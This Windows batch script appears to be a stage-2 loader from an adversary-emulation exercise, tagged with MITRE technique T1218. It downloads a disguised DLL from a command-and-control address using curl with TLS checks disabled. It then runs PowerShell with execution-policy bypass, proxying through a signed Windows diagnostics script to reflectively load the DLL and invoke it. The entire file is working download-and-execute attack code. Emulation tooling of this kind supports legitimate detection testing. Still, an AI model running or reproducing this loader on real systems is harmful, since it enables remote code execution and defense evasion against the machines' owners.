@echo off
setlocal enabledelayedexpansion

REM Stage 2 BAT - Download and invoke .NET Loader DLL via PowerShell LOLBIN
REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET aBcDeFgH=%APPDATA%\11995\e5266ae5
SET xYz123Ab=e1e137b8.txt
SET qWeRtY=https://10.0.0.49/stage/2/icon.png?11995-7
SET lMnOpQr=ITZEL-S2B
SET sTuVwXy=11995
SET zZaAbBc=7
SET cCdDeEf=%PUBLIC%\\macula-simulations.log

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM Debug log: script start
echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: script_start>> "!cCdDeEf!" 2>nul

REM Step 1: Heartbeat fetch - download Stage 2 Loader DLL from C2
echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: heartbeat_start>> "!cCdDeEf!" 2>nul
curl -k -s -o "!aBcDeFgH!\!xYz123Ab!" "!qWeRtY!" >nul 2>&1
if !errorlevel! neq 0 (
    echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: heartbeat_failed>> "!cCdDeEf!" 2>nul
    goto :invocation_fail
)
echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: heartbeat_complete>> "!cCdDeEf!" 2>nul

REM Step 2: Position working directory
echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: chdir_start>> "!cCdDeEf!" 2>nul
cd /d "!aBcDeFgH!" >nul 2>&1
if !errorlevel! equ 0 (
    echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: chdir_result=0>> "!cCdDeEf!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: chdir_result=1>> "!cCdDeEf!" 2>nul
)

REM Step 3: Invoke Stage 2 DLL via PowerShell (LOLBIN: powershell.exe)
echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: powershell_start>> "!cCdDeEf!" 2>nul
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\CL_LoadAssembly.ps1; $n=[AppDomain]::CurrentDomain.GetAssemblies().Count; LoadAssemblyFromPath %APPDATA%\11995\e5266ae5\e1e137b8.txt; $asm=([AppDomain]::CurrentDomain.GetAssemblies() | Select-Object -Skip $n -First 1); ($asm.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null)"
set ps_exit=!errorlevel!
if !ps_exit! equ 0 (
    echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: powershell_end=0>> "!cCdDeEf!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: powershell_end=!ps_exit!>> "!cCdDeEf!" 2>nul
)
goto :log_ttp

:invocation_fail
echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: powershell_end=1>> "!cCdDeEf!" 2>nul
set ps_exit=1

:log_ttp
REM Generate timestamp for TTP log
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set ttp_ts=%%t
if !ps_exit! equ 0 (
    echo [!ttp_ts!][TTP][!lMnOpQr!][!sTuVwXy!]: T1218^|System Binary Proxy Execution=OK:[]>> "!cCdDeEf!" 2>&1
) else (
    echo [!ttp_ts!][TTP][!lMnOpQr!][!sTuVwXy!]: T1218^|System Binary Proxy Execution=FAIL:exitcode=!ps_exit!>> "!cCdDeEf!" 2>&1
)

endlocal